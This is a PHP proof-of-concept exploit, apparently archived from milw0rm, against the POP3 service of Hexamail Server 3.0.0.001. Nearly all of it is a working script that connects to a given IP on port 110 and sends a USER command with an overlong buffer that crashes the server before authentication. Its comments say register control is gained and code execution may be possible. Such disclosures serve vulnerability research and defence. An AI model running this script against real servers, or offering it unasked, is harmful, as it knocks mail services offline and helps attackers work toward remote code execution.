<html><head><title>Hexamail Server 3.0.0.001 (pop3) pre-auth Remote Overflow PoC</title></head><pre>&lt;?php
/*

Hexamail Server 3.0.0.001 (pop3) pre-auth remote overflow poc

by rgod
http://retrogod.altervista.org

tested against the Lite one
this one crashes the entire server
you are in control of eax and ecx,
I think arbitrary code execution is possible
but a little tricky, see you soon ;)

vendor url: http://www.hexamail.com/hexamailserver/

*/

error_reporting(0);
if ($argc&lt;2) {die(&quot;[!]Syntax: php $argv[0] [ip]\n&quot;);}
echo &quot;[*]Connecting to target host...\n&quot;;
$fp=fsockopen($argv[1],110, $errno, $errstr, 5);
if (!$fp) {die(&quot;[!]unable to connect ...&quot;);}
else {echo &quot;[*]connected...\n&quot;;}
$eax=&quot;XXXX&quot;;
$ecx=&quot;YYYY&quot;;
$bof=&quot;./&quot;.str_repeat(&quot;A&quot;,15).$eax.$ecx.str_repeat(&quot;A&quot;,1025);
$bof = &quot;USER &quot;.$bof.&quot;\r\n&quot;;
fputs($fp,$bof);
fgets($fp);
fclose($fp);
echo &quot;[*]Sent.\n&quot;;
sleep(2);
$fp=fsockopen($argv[1],110, $errno, $errstr, 5);
if (!$fp) {echo &quot;[*]exploit succeeded...\n&quot;;}
else {echo &quot;[!]it seems not working...\n&quot;;}
?&gt;

# milw0rm.com [2007-08-30]</pre></html>